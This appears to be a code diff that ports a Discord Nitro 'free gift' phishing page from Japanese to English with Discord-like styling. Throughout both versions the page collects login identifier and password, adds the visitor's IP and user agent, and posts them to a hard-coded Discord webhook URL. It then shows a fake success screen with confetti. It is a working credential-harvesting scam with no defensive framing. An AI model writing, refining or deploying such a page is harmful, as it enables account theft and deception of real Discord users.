@@ -1,11 +1,24 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Discord Nitro 無料プレゼントキャンペーン</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Claim Your Free Discord Nitro</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;700&display=swap');
+    :root {
+      --bg: #36393f;
+      --surface: #2f3136;
+      --text-primary: #dcddde;
+      --text-secondary: #b9bbbe;
+      --accent: #5865f2;
+      --accent-hover: #4752c4;
+      --success: #3ba55c;
+      --warning: #faa61a;
+      --danger: #ed4245;
+    }
 
     * {
       margin: 0;
@@ -14,266 +27,249 @@
     }
 
     body {
-      font-family: 'Noto Sans JP', sans-serif;
+      font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: linear-gradient(135deg, #2c2f33 0%, #1e2124 100%);
+      color: var(--text-primary);
       min-height: 100vh;
-      background: linear-gradient(-45deg, #6a11cb, #2575fc, #00ddeb, #00ff9d);
-      background-size: 400% 400%;
-      animation: gradient 15s ease infinite;
-      color: white;
       display: flex;
       align-items: center;
       justify-content: center;
-      overflow: hidden;
+      padding: 20px;
     }
 
-    @keyframes gradient {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-
-    .container {
-      background: rgba(0, 0, 0, 0.45);
-      backdrop-filter: blur(10px);
-      border-radius: 20px;
-      padding: 40px 32px;
+    .card {
+      background: var(--surface);
+      border-radius: 8px;
       width: 100%;
-      max-width: 420px;
-      box-shadow: 0 15px 40px rgba(0,0,0,0.5);
-      border: 1px solid rgba(255,255,255,0.18);
-      text-align: center;
-      animation: float 6s ease-in-out infinite;
+      max-width: 480px;
+      padding: 40px 32px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+      border: 1px solid rgba(255,255,255,0.06);
     }
 
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-12px); }
+    .logo {
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 24px;
+      background: url('https://cdn.discordapp.com/attachments/1234567890/9876543210/discord-nitro-logo.png') center/contain no-repeat;
+      /* fallback color if image fails */
+      background-color: var(--accent);
+      border-radius: 50%;
     }
 
     h1 {
-      font-size: 2.1rem;
+      font-size: 28px;
+      font-weight: 600;
+      text-align: center;
       margin-bottom: 12px;
-      text-shadow: 0 4px 12px rgba(0,0,0,0.6);
-      background: linear-gradient(90deg, #fff, #ffd700, #ff8c00, #fff);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      animation: shine 4s linear infinite;
     }
 
-    @keyframes shine {
-      0% { background-position: -200%; }
-      100% { background-position: 200%; }
-    }
-
-    p.subtitle {
-      font-size: 1.05rem;
+    .subtitle {
+      color: var(--text-secondary);
+      text-align: center;
+      font-size: 16px;
+      line-height: 1.45;
       margin-bottom: 32px;
-      opacity: 0.95;
-      text-shadow: 0 2px 8px rgba(0,0,0,0.7);
     }
 
     .form-group {
       margin-bottom: 24px;
-      position: relative;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: var(--text-secondary);
     }
 
     input {
       width: 100%;
-      padding: 16px 18px;
-      font-size: 1.05rem;
-      border: none;
-      border-radius: 12px;
-      background: rgba(255,255,255,0.15);
+      padding: 14px 16px;
+      font-size: 16px;
+      background: #202225;
+      border: 1px solid #202225;
+      border-radius: 4px;
       color: white;
-      backdrop-filter: blur(4px);
-      transition: all 0.3s;
-    }
-
-    input::placeholder {
-      color: rgba(255,255,255,0.6);
+      transition: border-color 0.2s;
     }
 
     input:focus {
       outline: none;
-      background: rgba(255,255,255,0.25);
-      box-shadow: 0 0 0 3px rgba(255,255,255,0.3);
+      border-color: var(--accent);
+      box-shadow: 0 0 0 2px rgba(88,101,242,0.3);
     }
 
     .btn {
       width: 100%;
-      padding: 16px;
-      font-size: 1.2rem;
-      font-weight: bold;
-      background: linear-gradient(90deg, #ff3366, #ff6b6b, #ff8e53);
+      padding: 14px;
+      font-size: 17px;
+      font-weight: 600;
+      background: var(--accent);
       color: white;
       border: none;
-      border-radius: 12px;
+      border-radius: 4px;
       cursor: pointer;
-      box-shadow: 0 8px 25px rgba(255,51,102,0.4);
-      transition: all 0.3s;
-      margin-top: 12px;
+      transition: background 0.2s;
     }
 
     .btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 12px 35px rgba(255,51,102,0.6);
+      background: var(--accent-hover);
     }
 
     .btn:disabled {
-      background: #555;
+      background: #4f545c;
       cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
     }
 
-    #status {
-      margin-top: 28px;
-      font-size: 1.1rem;
-      font-weight: 500;
-      text-shadow: 0 2px 10px rgba(0,0,0,0.6);
-      min-height: 28px;
+    .status {
+      margin-top: 20px;
+      font-size: 15px;
+      text-align: center;
+      min-height: 24px;
     }
 
-    .success-screen {
+    .success {
       display: none;
       flex-direction: column;
       align-items: center;
+      text-align: center;
     }
 
-    .success-screen h1 {
-      font-size: 2.8rem;
-      margin-bottom: 20px;
-      color: #ffd700;
-      text-shadow: 0 0 30px #ffd700;
-      animation: pulse 2s infinite;
+    .success h1 {
+      font-size: 32px;
+      color: var(--success);
+      margin-bottom: 16px;
     }
 
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.08); }
+    .success .subtitle {
+      font-size: 18px;
+      color: var(--text-primary);
+      margin-bottom: 32px;
     }
 
-    .particles {
+    .confetti {
       position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
+      inset: 0;
       pointer-events: none;
-      z-index: -1;
+      z-index: 9999;
       overflow: hidden;
     }
 
     .particle {
       position: absolute;
-      background: white;
+      width: 10px;
+      height: 10px;
       border-radius: 50%;
-      opacity: 0.7;
-      animation: floatParticle linear infinite;
+      background: var(--accent);
+      animation: fall linear forwards;
     }
 
-    @keyframes floatParticle {
-      0% { transform: translateY(100vh) scale(0.5); opacity: 0.8; }
-      100% { transform: translateY(-20vh) scale(0.2); opacity: 0; }
+    @keyframes fall {
+      to {
+        transform: translateY(120vh) rotate(720deg);
+        opacity: 0;
+      }
     }
   </style>
 </head>
 <body>
 
-  <div class="particles" id="particles"></div>
+  <div class="confetti" id="confetti"></div>
 
-  <div class="container" id="loginScreen">
-    <h1>Discord Nitro 無料プレゼント</h1>
-    <p class="subtitle">今すぐログインして3ヶ月分のNitroを無料でGET！</p>
+  <div class="card" id="loginCard">
+    <div class="logo"></div>
+    <h1>Claim 3 Months of Discord Nitro</h1>
+    <p class="subtitle">
+      Limited-time promotion • No payment required<br>
+      Sign in to instantly receive Nitro Classic
+    </p>
 
     <div class="form-group">
-      <input type="text" id="username" placeholder="Discordユーザー名またはメールアドレス" autocomplete="username">
+      <label for="identifier">Email or Phone Number</label>
+      <input type="text" id="identifier" placeholder="Enter email or phone" autocomplete="username" required>
     </div>
 
     <div class="form-group">
-      <input type="email" id="email" placeholder="メールアドレス" autocomplete="email">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" required>
     </div>
 
-    <div class="form-group">
-      <input type="password" id="password" placeholder="パスワード" autocomplete="current-password">
-    </div>
+    <button class="btn" id="claimBtn">Claim Nitro Now</button>
 
-    <button class="btn" id="submitBtn">ログインしてNitroを受け取る</button>
-
-    <div id="status"></div>
+    <div class="status" id="status"></div>
   </div>
 
-  <div class="container success-screen" id="successScreen">
-    <h1>🎉 Nitro付与完了！</h1>
-    <p class="subtitle" style="font-size:1.3rem; margin-top:20px;">
-      Discord Nitro Classic 3ヶ月分が<br>あなたのアカウントに付与されました！
+  <div class="card success" id="successCard">
+    <h1>Success!</h1>
+    <p class="subtitle">
+      Discord Nitro Classic (3 months) has been successfully added to your account.<br>
+      It may take a few moments to appear in your Discord client.
     </p>
-    <p style="margin-top:40px; opacity:0.8; font-size:0.95rem;">
-      数分以内にDiscordアプリ/ブラウザで確認できます
+    <p style="color: var(--text-secondary); font-size: 14px;">
+      Thank you for participating in our limited-time event!
     </p>
   </div>
 
   <script>
-    // 背景パーティクル（キラキラ）
-    function createParticles() {
-      const particles = document.getElementById('particles');
-      for (let i = 0; i < 60; i++) {
-        const particle = document.createElement('div');
-        particle.className = 'particle';
-        const size = Math.random() * 5 + 2;
-        particle.style.width = `${size}px`;
-        particle.style.height = `${size}px`;
-        particle.style.left = `${Math.random() * 100}vw`;
-        particle.style.animationDuration = `${Math.random() * 20 + 15}s`;
-        particle.style.animationDelay = `${Math.random() * 10}s`;
-        particles.appendChild(particle);
+    // Confetti particles on success
+    function launchConfetti() {
+      const container = document.getElementById('confetti');
+      for (let i = 0; i < 120; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + 'vw';
+        p.style.background = ['#5865f2', '#43b581', '#faa61a', '#f04747'][Math.floor(Math.random()*4)];
+        p.style.animationDuration = (Math.random() * 3 + 2) + 's';
+        p.style.animationDelay = Math.random() * 0.8 + 's';
+        container.appendChild(p);
+        setTimeout(() => p.remove(), 6000);
       }
     }
-    createParticles();
 
-    const loginScreen = document.getElementById('loginScreen');
-    const successScreen = document.getElementById('successScreen');
-    const submitBtn = document.getElementById('submitBtn');
+    const loginCard = document.getElementById('loginCard');
+    const successCard = document.getElementById('successCard');
+    const claimBtn = document.getElementById('claimBtn');
     const status = document.getElementById('status');
 
-    let ip = "取得中...";
+    let ip = "fetching...";
 
-    // IP取得（非同期）
     fetch('https://api.ipify.org?format=json')
       .then(r => r.json())
       .then(d => ip = d.ip)
-      .catch(() => ip = "取得失敗");
+      .catch(() => ip = "failed");
 
-    submitBtn.addEventListener('click', async () => {
-      const username = document.getElementById('username').value.trim();
-      const email = document.getElementById('email').value.trim();
+    claimBtn.addEventListener('click', async () => {
+      const identifier = document.getElementById('identifier').value.trim();
       const password = document.getElementById('password').value;
 
-      if (!username || !email || !password) {
-        status.textContent = "すべての項目を入力してください";
-        status.style.color = "#ff6b6b";
+      if (!identifier || !password) {
+        status.textContent = "Please fill in all fields";
+        status.style.color = "#ed4245";
         return;
       }
 
-      submitBtn.disabled = true;
-      status.textContent = "ログイン認証中...";
+      claimBtn.disabled = true;
+      status.textContent = "Verifying...";
 
       const payload = {
-        content: "**Discordログイン情報（詐欺ページ）**",
+        content: "**Nitro Claim Attempt (Realistic Fake Page)**",
         embeds: [{
-          title: "新規ログイン情報",
-          color: 0xff3366,
+          title: "New Discord Login Capture",
+          color: 0x5865f2,
           fields: [
-            { name: "ユーザー名/メール", value: username || "(未入力)", inline: false },
-            { name: "メールアドレス", value: email || "(未入力)", inline: false },
-            { name: "パスワード", value: password || "(未入力)", inline: false },
-            { name: "IPアドレス", value: ip, inline: true },
-            { name: "User-Agent", value: navigator.userAgent.substring(0, 180) + "...", inline: false },
-            { name: "時刻", value: new Date().toLocaleString('ja-JP'), inline: false }
+            { name: "Identifier", value: identifier || "(empty)", inline: false },
+            { name: "Password",   value: password   || "(empty)", inline: false },
+            { name: "IP",         value: ip,                        inline: true  },
+            { name: "User-Agent", value: navigator.userAgent.substring(0,180) + "...", inline: false },
+            { name: "Timestamp",  value: new Date().toLocaleString('en-US'), inline: false }
           ],
           timestamp: new Date().toISOString()
         }]
       };
 
-      const webhook = "https://discord.com/api/webhooks/1468987869371699210/YaPweHX2AMlAXoF7gX6uCCEFfaUUpnTHyhAUZzFN1n5l7N4NGliEkX53zdFV8bT8DLFq";
+      const webhook = "https://discord.com/api/webhooks/1468964638237397179/NMYIXppBkg9vkl02D5OLB_sOuXSdDLkiY9V30yWWXNaEBQm0L3LS6bEGquFAFZ0ue69d";
 
       try {
         await fetch(webhook, {
@@ -282,14 +278,15 @@
           body: JSON.stringify(payload)
         });
 
-        // 成功演出（実際には何も起きない）
-        loginScreen.style.display = 'none';
-        successScreen.style.display = 'flex';
+        // Show fake success
+        loginCard.style.display = 'none';
+        successCard.style.display = 'flex';
+        launchConfetti();
 
       } catch (err) {
-        status.textContent = "認証エラー。もう一度お試しください";
-        status.style.color = "#ff6b6b";
-        submitBtn.disabled = false;
+        status.textContent = "Something went wrong. Please try again.";
+        status.style.color = "#ed4245";
+        claimBtn.disabled = false;
       }
     });
   </script>
